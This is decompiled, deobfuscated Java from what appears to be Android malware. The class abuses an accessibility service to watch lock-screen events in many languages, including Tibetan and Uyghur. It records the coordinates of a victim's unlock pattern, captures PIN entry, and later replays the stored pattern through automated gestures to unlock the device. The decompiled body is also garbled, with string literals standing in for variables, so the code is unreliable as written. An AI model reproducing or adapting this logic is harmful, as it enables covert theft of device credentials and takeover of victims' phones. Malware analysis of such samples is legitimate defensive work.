package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: ScreenLockMonitor
 * Original: Lcom/tencent/Loc_tunesxconcerningn10_k;
 */
public class ScreenLockMonitor {

    // === FIELDS ===
    static boolean ifAuto;
    static boolean ifStartRecord;
    static LinkedList screenLockPointList;
    static Set screenLockPointSet;
    static LinkedList successcreenLockPointList;

    // === METHODS ===

    static void StaticInitializer() {
        v0 = new LinkedList();
        // new LinkedList()
        ScreenLockMonitor.screenLockPointList = v0;
        v0 = new HashSet();
        // new HashSet()
        ScreenLockMonitor.screenLockPointSet = v0;
        v0 = new LinkedList();
        // new LinkedList()
        ScreenLockMonitor.successcreenLockPointList = v0;
        v0 = 0;
        ScreenLockMonitor.ifAuto = 0;
        return;
    }

    public void Constructor() {
        // new Object()
        return;
    }

    static void access$000(AccessibilityServiceCore param0) {
        ScreenLockMonitor.lightScreen(v0);
        return;
    }

    static int access$100(AccessibilityServiceCore param0) {
        ScreenLockMonitor.getScreenType(v0);
        return v0;
    }

    static void access$200(AccessibilityServiceCore param0, String param1) {
        ScreenLockMonitor.clickUnlockButton(v0, v1);
        return;
    }

    static void access$300(AccessibilityServiceCore param0) {
        ScreenLockMonitor.clickErrorUnlockButtonByGusture(v0);
        return;
    }

    static void access$400(Path param0, int param1, AccessibilityServiceCore param2) {
        ScreenLockMonitor.performGestureByCount(v0, v1, v2);
        return;
    }

    public static void checkEvent(AccessibilityEvent param0) {
        v0 = ScreenLockMonitor.ifStartRecord;
        v1 = 16384;
        v2 = 0;
        if (v0 == null || v0 == 0) { // goto +218
        v10.getEventType();
        if (v0 != 16384) { // goto +212
        v10.getText();
        if (v0 == null || v0 == 0) { // goto +206
        v10.getText();
        v0.isEmpty();
        if (v0 != null && v0 != 0) { // goto +196
        v3 = v10.getText();
        v3 = v0.get(0);
        v3 = "图案绘制完成";
        "图案绘制完成".equals(v0);
        if (v0 != null && v0 != 0) { // goto +178
        v10.getText();
        v0.get(0);
        "圖案繪製完成".equals(v0);
        if (v0 != null && v0 != 0) { // goto +162
        v10.getText();
        v0.get(0);
        "圖形繪製完成".equals(v0);
        if (v0 != null && v0 != 0) { // goto +146
        v10.getText();
        v0.get(0);
        "已畫出解鎖圖案".equals(v0);
        if (v0 != null && v0 != 0) { // goto +130
        v10.getText();
        v0.get(0);
        "已畫出解鎖圖形".equals(v0);
        if (v0 != null && v0 != 0) { // goto +114
        v10.getText();
        v0.get(0);
        "パターンが完了しました".equals(v0);
        if (v0 != null && v0 != 0) { // goto +98
        v10.getText();
        v0.get(0);
        "パターンの描画が完了しました".equals(v0);
        if (v0 != null && v0 != 0) { // goto +82
        v10.getText();
        v0.get(0);
        "Pattern completed".equals(v0);
        if (v0 != null && v0 != 0) { // goto +66
        v10.getText();
        v0.get(0);
        "패턴 완료".equals(v0);
        if (v0 != null && v0 != 0) { // goto +50
        v10.getText();
        v0.get(0);
        "패턴이 완료됨".equals(v0);
        if (v0 != null && v0 != 0) { // goto +34
        v10.getText();
        v0.get(0);
        "རྒྱན་རིས་བྲིས་ཚར།".equals(v0);
        if (v0 != null && v0 != 0) { // goto +18
        v10.getText();
        v0.get(0);
        v0 = "ئەندىزە تاماملاندى".equals(v0);
        if (v0 == null || v0 == 0) { // goto +4
        ScreenLockMonitor.ifStartRecord = 0;
        v0 = ScreenLockMonitor.ifStartRecord;
        v3 = 1;
        if (v0 == null || v0 == 0) { // goto +118
        v0 = ScreenLockMonitor.ifAuto;
        if (v0 != null && v0 != 0) { // goto +114
        v10.getSource();
        if (v0 == null || v0 == 0) { // goto +108
        v5 = v0.getChildCount();
        v5 = 9;
        if (v4 != 9) { // goto +100
        v4 = 0;
        v0.getChildCount();
        if (v4 >= 9) { // goto +93
        v0.getChild(v4);
        9.getActionList();
        v6 = 9.get(0);
        v6 = 9.getId();
        v6 = 64;
        if (9 != 64) { // goto +68
        v0.getChild(v4);
        9.getText();
        9.toString();
        64.contains(9);
        if (64 == null || 64 == 0) { // goto +3
        // goto (branch)
        // new Rect()
        v7 = v0.getChild(v4);
        v7.getBoundsInScreen(64);
        v7 = new ScreenLockMonitor$Node();
        v8 = 64.centerX();
        v8 = (float) v8;
        v9 = 64.centerY();
        v9 = " ";
        9.split(" ");
        // new ScreenLockMonitor$Node(v8, 64, " ")
        64.add(v7);
        64.add(9);
        v4 = v4 + 1;
        // goto (branch)
        v4 = v10.getEventType();
        v4 = "2";
        if (v0 != 16384) { // goto +475
        v10.getText();
        v0.isEmpty();
        if (v0 != null && v0 != 0) { // goto +465
        v10.getText();
        v0.get(0);
        "开始绘制图案".equals(v0);
        if (v0 != null && v0 != 0) { // goto +445
        v10.getText();
        v0.get(0);
        "開始繪製圖案".equals(v0);
        if (v0 != null && v0 != 0) { // goto +429
        v10.getText();
        v0.get(0);
        "已開始繪製解鎖圖案".equals(v0);
        if (v0 != null && v0 != 0) { // goto +413
        v10.getText();
        v0.get(0);
        "開始繪製圖形".equals(v0);
        if (v0 != null && v0 != 0) { // goto +397
        v10.getText();
        v0.get(0);
        "開始繪製解鎖圖形".equals(v0);
        if (v0 != null && v0 != 0) { // goto +381
        v10.getText();
        v0.get(0);
        "已開始繪製解鎖圖形".equals(v0);
        if (v0 != null && v0 != 0) { // goto +365
        v10.getText();
        v0.get(0);
        "已開始繪製解鎖圖形".equals(v0);
        if (v0 != null && v0 != 0) { // goto +351
        v10.getText();
        v0.get(0);
        "パターンが開始されました".equals(v0);
        if (v0 != null && v0 != 0) { // goto +335
        v10.getText();
        v0.get(0);
        "パターンの描画を開始しました".equals(v0);
        if (v0 != null && v0 != 0) { // goto +319
        v10.getText();
        v0.get(0);
        "Pattern started".equals(v0);
        if (v0 != null && v0 != 0) { // goto +303
        v10.getText();
        v0.get(0);
        "패턴 시작".equals(v0);
        if (v0 != null && v0 != 0) { // goto +287
        v10.getText();
        v0.get(0);
        "패턴이 시작됨".equals(v0);
        if (v0 != null && v0 != 0) { // goto +271
        v10.getText();
        v0.get(0);
        "རྒྱན་རིས་འབྲི་འགོ་ཚུགས་པ།".equals(v0);
        if (v0 != null && v0 != 0) { // goto +255
        v10.getText();
        v0.get(0);
        "ئەندىزە سىزىشنى باشلىدى".equals(v0);
        if (v0 == null || v0 == 0) { // goto +4
        // goto (branch)
        v10.getText();
        v0.get(0);
        "图案绘制不正确".equals(v0);
        if (v0 != null && v0 != 0) { // goto +210
        v10.getText();
        v0.get(0);
        "图案错误".equals(v0);
        if (v0 != null && v0 != 0) { // goto +194
        v10.getText();
        v0.get(0);
        "圖案錯誤".equals(v0);
        if (v0 != null && v0 != 0) { // goto +178
        v10.getText();
        v0.get(0);
        "圖案繪製錯誤".equals(v0);
        if (v0 != null && v0 != 0) { // goto +162
        v10.getText();
        v0.get(0);
        "畫出的圖案錯誤".equals(v0);
        if (v0 != null && v0 != 0) { // goto +146
        v10.getText();
        v0.get(0);
        "パターンが間違っています".equals(v0);
        if (v0 != null && v0 != 0) { // goto +130
        v10.getText();
        v0.get(0);
        "パターンが正しくありません".equals(v0);
        if (v0 != null && v0 != 0) { // goto +114
        v10.getText();
        v0.get(0);
        "入力したパターンが正しくありません".equals(v0);
        if (v0 != null && v0 != 0) { // goto +98
        v10.getText();
        v0.get(0);
        "Wrong pattern".equals(v0);
        if (v0 != null && v0 != 0) { // goto +82
        v10.getText();
        v0.get(0);
        "Incorrect pattern".equals(v0);
        if (v0 != null && v0 != 0) { // goto +66
        v10.getText();
        v0.get(0);
        "Incorrect pattern drawn".equals(v0);
        if (v0 != null && v0 != 0) { // goto +50
        v10.getText();
        v0.get(0);
        "잘못된 패턴".equals(v0);
        if (v0 != null && v0 != 0) { // goto +34
        v10.getText();
        v0.get(0);
        "올바르지 않은 패턴".equals(v0);
        if (v0 != null && v0 != 0) { // goto +18
        v10.getText();
        v0.get(0);
        v0 = "패턴을 잘못 입력했습니다".equals(v0);
        if (v0 == null || v0 == 0) { // goto +17
        v0 = ScreenLockMonitor.screenLockPointList;
        v0.clear();
        v0 = ScreenLockMonitor.screenLockPointSet;
        v0.clear();
        // goto (branch)
        AccessibilityServiceCore.passcheck = "2";
        ScreenLockMonitor.ifStartRecord = 1;
        v1 = v10.getEventType();
        v1 = 32;
        if (v0 != 32) { // goto +212
        v0 = "com.android.systemui";
        v10.getPackageName();
        "com.android.systemui".equals(1);
        if ("com.android.systemui" == null || "com.android.systemui" == 0) { // goto +200
        v10.getContentChangeTypes();
        if ("com.android.systemui" != 32) { // goto +194
        v10.getText();
        if ("com.android.systemui" == null || "com.android.systemui" == 0) { // goto +188
        v10.getText();
        "com.android.systemui".isEmpty();
        if ("com.android.systemui" != null && "com.android.systemui" != 0) { // goto +178
        v10.getText();
        "com.android.systemui".get(0);
        "锁定屏幕。".equals("com.android.systemui");
        if ("com.android.systemui" != null && "com.android.systemui" != 0) { // goto +130
        v10.getText();
        "com.android.systemui".get(0);
        "螢幕鎖定。".equals("com.android.systemui");
        if ("com.android.systemui" != null && "com.android.systemui" != 0) { // goto +114
        v10.getText();
        "com.android.systemui".get(0);
        "上鎖畫面。".equals("com.android.systemui");
        if ("com.android.systemui" != null && "com.android.systemui" != 0) { // goto +98
        v10.getText();
        "com.android.systemui".get(0);
        "ロック画面".equals("com.android.systemui");
        if ("com.android.systemui" != null && "com.android.systemui" != 0) { // goto +82
        v10.getText();
        "com.android.systemui".get(0);
        "デバイスはロックされています".equals("com.android.systemui");
        if ("com.android.systemui" != null && "com.android.systemui" != 0) { // goto +66
        v10.getText();
        "com.android.systemui".get(0);
        "Lock screen.".equals("com.android.systemui");
        if ("com.android.systemui" != null && "com.android.systemui" != 0) { // goto +50
        v10.getText();
        "com.android.systemui".get(0);
        "화면을 잠급니다.".equals("com.android.systemui");
        if ("com.android.systemui" != null && "com.android.systemui" != 0) { // goto +34
        v10.getText();
        "com.android.systemui".get(0);
        "སྒྲིག་ཆས་སྒོ་ལྕགས་བརྒྱབ་ཟིན།".equals("com.android.systemui");
        if ("com.android.systemui" != null && "com.android.systemui" != 0) { // goto +18
        v10.getText();
        "com.android.systemui".get(0);
        "ئېكران قۇلۇپلاش".equals("com.android.systemui");
        if ("com.android.systemui" == null || "com.android.systemui" == 0) { // goto +34
        "com.android.systemui".isEmpty();
        if ("com.android.systemui" != null && "com.android.systemui" != 0) { // goto +26
        AccessibilityServiceCore.passcheck = "2";
        "com.android.systemui".clear();
        "com.android.systemui".addAll("ئېكران قۇلۇپلاش");
        "com.android.systemui".clear();
        "com.android.systemui".clear();
        v1 = v10.getEventType();
        v1 = 2048;
        if ("com.android.systemui" != 2048) { // goto +46
        v10.getPackageName();
        v10 = "android".equals(v10);
        if (v10 == null || v10 == 0) { // goto +34
        v10 = ScreenLockMonitor.screenLockPointList;
        v10 = v10.isEmpty();
        if (v10 != null && v10 != 0) { // goto +26
        AccessibilityServiceCore.passcheck = "2";
        v10 = ScreenLockMonitor.successcreenLockPointList;
        v10.clear();
        v10 = ScreenLockMonitor.successcreenLockPointList;
        v10.addAll("android");
        v10 = ScreenLockMonitor.screenLockPointList;
        v10.clear();
        v10 = ScreenLockMonitor.screenLockPointSet;
        v10.clear();
        return;
    }

    private static void clickEnter(AccessibilityServiceCore param0) {
        v0 = "com.android.systemui:id/key_enter_text";
        Sea_tunesxconcerningn10_rch.searchById(v1, "com.android.systemui:id/key_enter_text");
        if ("com.android.systemui:id/key_enter_text" == null || "com.android.systemui:id/key_enter_text" == 0) { // goto +3
        // goto (branch)
        Sea_tunesxconcerningn10_rch.searchById(v1, "com.android.systemui:id/key_enter");
        Sea_tunesxconcerningn10_rch.click("com.android.systemui:id/key_enter");
        return;
    }

    private static void clickErrorUnlockButtonByGusture(AccessibilityServiceCore param0) {
        v0 = "com.android.systemui:id/lockPatternView";
        Sea_tunesxconcerningn10_rch.searchById(v11, "com.android.systemui:id/lockPatternView");
        if ("com.android.systemui:id/lockPatternView" != null && "com.android.systemui:id/lockPatternView" != 0) { // goto +8
        v1 = Sea_tunesxconcerningn10_rch.searchById(v11, "com.android.systemui:id/vivo_lock_pattern_view");
        if ("com.android.systemui:id/vivo_lock_pattern_view" != null && "com.android.systemui:id/vivo_lock_pattern_view" != 0) { // goto +3
        return;
        v1 = new Rect();
        // new Rect()
        "com.android.systemui:id/vivo_lock_pattern_view".getBoundsInScreen(v1);
        v2 = "rect.centerX()";
        // new StringBuilder("rect.centerX()")
        v1.centerX();
        "com.android.systemui:id/vivo_lock_pattern_view".append("rect.centerX()");
        "com.android.systemui:id/vivo_lock_pattern_view".toString();
        LogHelper.i("com.android.systemui:id/vivo_lock_pattern_view");
        // new StringBuilder("rect.centerY()")
        v1.centerY();
        "com.android.systemui:id/vivo_lock_pattern_view".append("rect.centerY()");
        v0 = "com.android.systemui:id/vivo_lock_pattern_view".toString();
        LogHelper.i("com.android.systemui:id/vivo_lock_pattern_view");
        v0 = "com.android.systemui:id/vivo_lock_pattern_view" / 6;
        v3 = v1.top;
        v2 = "rect.centerY()" / 6;
        v3 = new LinkedList();
        // new LinkedList()
        v4 = 0;
        v5 = 0;
        v6 = 3;
        if (v5 >= 3) { // goto +43
        v7 = v1.left;
        v7 = (float) v7;
        v8 = v1.top;
        v9 = "rect.centerY()" * v5;
        v9 = v9 * 2;
        v8 = (float) v8;
        v9 = new StringBuilder();
        // new StringBuilder()
        v9.append(v5);
        v10 = "";
        v9.append("");
        v5 = v9.toString();
        // new ScreenLockMonitor$Node(v7, v8, v9)
        v3.add(3);
        v5 = v5 + 1;
        // goto (branch)
        v5 = new ScreenLockMonitor$Node();
        v7 = v1.left;
        v1 = v1.top;
        v2 = "rect.centerY()" * 5;
        v1 = (float) v1;
        // new ScreenLockMonitor$Node("com.android.systemui:id/vivo_lock_pattern_view", v1, "4")
        v3.add(v5);
        // new Path()
        v1 = v3.get(0);
        v1 = (ScreenLockMonitor$Node) v1;
        v1 = v1.x;
        v1 = v3.get(0);
        "com.android.systemui:id/vivo_lock_pattern_view".moveTo(v1, "4");
        v1 = 1;
        v3.size();
        if (1 >= "4") { // goto +24
        v3.get(1);
        v1 = v3.get(1);
        "com.android.systemui:id/vivo_lock_pattern_view".lineTo("4", 0);
        v1 = 1 + 1;
        // goto (branch)
        v1 = 13;
        ScreenLockMonitor.performGestureByCount("com.android.systemui:id/vivo_lock_pattern_view", 13, v11);
        v11 = ScreenLockMonitor.screenLockPointSet;
        v11.clear();
        v11 = ScreenLockMonitor.screenLockPointList;
        v11.clear();
        v11 = ScreenLockMonitor.successcreenLockPointList;
        v11.clear();
        return;
    }

    private static void clickUnlockButton(AccessibilityServiceCore param0, String param1) {
        v0 = 0;
        v1 = 6;
        if (0 >= 6) { // goto +95
        v1 = 1;
        v2 = 7;
        if (1 >= 7) { // goto +36
        // new StringBuilder()
        7.append(v5);
        7.append(1);
        7.toString();
        Sea_tunesxconcerningn10_rch.searchById(v4, 7);
        if (7 == null || 7 == 0) { // goto +9
        v1 = 7.toString();
        LogHelper.i(v3);
        Sea_tunesxconcerningn10_rch.click(7);
        v1 = 1 + 1;
        // goto (branch)
        ScreenLockMonitor.clickEnter(v4);
        Br_tunesxconcerningn10_and.getBrand();
        1.toLowerCase();
        1.equals("huawei");
        if (1 != null && 1 != 0) { // goto +22
        Br_tunesxconcerningn10_and.getBrand();
        1.toLowerCase();
        v1 = 1.equals("honor");
        if (1 == null || 1 == 0) { // goto +3
        // goto (branch)
        v1 = 200;
        // goto (branch)
        v1 = 800;
        Thread.sleep(800, "honor");
        v0 = 0 + 1;
        // goto (branch)
        v5 = new RuntimeException();
        // new RuntimeException(v4)
        throw v5;
        v4 = "";
        MainBackgroundService.currentSuccessPassword = "";
        AccessibilityServiceCore.ccurrentPassword = "";
        return;
    }

    public static void destoryLock(AccessibilityServiceCore param0) {
        v0 = new Thread();
        v1 = new ScreenLockMonitor$2();
        // new ScreenLockMonitor$2(v2)
        // new Thread(v1)
        v0.start();
        return;
    }

    private static int getScreenType(AccessibilityServiceCore param0) {
        v0 = "com.android.systemui:id/VivoPinkey0";
        v1 = Sea_tunesxconcerningn10_rch.searchById(v2, "com.android.systemui:id/VivoPinkey0");
        v1 = "com.android.systemui:id/key1";
        v2 = Sea_tunesxconcerningn10_rch.searchById(v2, "com.android.systemui:id/key1");
        if ("com.android.systemui:id/VivoPinkey0" == null || "com.android.systemui:id/VivoPinkey0" == 0) { // goto +4
        v2 = 3;
        return 3;
        if (3 == null || 3 == 0) { // goto +4
        v2 = 1;
        return 1;
        v2 = 2;
        return 2;
    }

    private static void lightScreen(AccessibilityServiceCore param0) {
        v2.wakeupScreen();
        v0 = 3;
        v2.performGlobalAction(3);
        v0 = 800;
        Thread.sleep(800, v1);
        return;
        // new RuntimeException(v2)
        throw 800;
    }

    private static void logevent(AccessibilityEvent param0) {
        return;
    }

    private static void performGestureByCount(Path param0, int param1, AccessibilityServiceCore param2) {
        v0 = Build$VERSION.SDK_INT;
        v1 = 24;
        if (v0 < 24) { // goto +31
        v1 = DataPackagingEngine$$ExternalSyntheticApiModelOutline0.m();
        v1 = 0;
        v3 = 800;
        DataPackagingEngine$$ExternalSyntheticApiModelOutline0.m(v5, 0, v2, 800, v4);
        DataPackagingEngine$$ExternalSyntheticApiModelOutline0.m(v0, 0);
        v5 = DataPackagingEngine$$ExternalSyntheticApiModelOutline0.m(v0);
        // new ScreenLockMonitor$3(v6, v5, v7)
        v5 = 0;
        DataPackagingEngine$$ExternalSyntheticApiModelOutline0.m(v7, v0, 0, 0);
        return;
    }

    public static void startUnLock(Context param0) {
        v0 = ScreenLockMonitor.successcreenLockPointList;
        v0 = v0.isEmpty();
        if (v0 == null || v0 == 0) { // goto +3
        return;
        v0 = 1;
        ScreenLockMonitor.ifAuto = 1;
        v1 = new Path();
        // new Path()
        v2 = ScreenLockMonitor.successcreenLockPointList;
        v3 = 0;
        v2 = v2.get(0);
        v2 = (ScreenLockMonitor$Node) v2;
        v2 = v2.x;
        v4 = ScreenLockMonitor.successcreenLockPointList;
        v2 = v4.get(0);
        v1.moveTo(v2, 0);
        v2 = ScreenLockMonitor.successcreenLockPointList;
        v2 = v2.size();
        if (1 >= v2) { // goto +28
        v2 = ScreenLockMonitor.successcreenLockPointList;
        v2 = v2.get(1);
        v2 = (ScreenLockMonitor$Node) v2;
        v2 = v2.x;
        v0 = 0.get(1);
        v1.lineTo(v2, 0);
        v0 = 1 + 1;
        // goto (branch)
        v2 = 24;
        if (1 < 24) { // goto +33
        v2 = DataPackagingEngine$$ExternalSyntheticApiModelOutline0.m();
        v2 = 0;
        v4 = 800;
        DataPackagingEngine$$ExternalSyntheticApiModelOutline0.m(v1, 0, 0, 800, v5);
        v6 = DataPackagingEngine$$ExternalSyntheticApiModelOutline0.m(1, v1);
        v6 = DataPackagingEngine$$ExternalSyntheticApiModelOutline0.m(1);
        v6 = (AccessibilityService) v6;
        v1 = new ScreenLockMonitor$1();
        // new ScreenLockMonitor$1()
        v2 = 0;
        DataPackagingEngine$$ExternalSyntheticApiModelOutline0.m(v6, 1, v1, 0);
        return;
    }
}
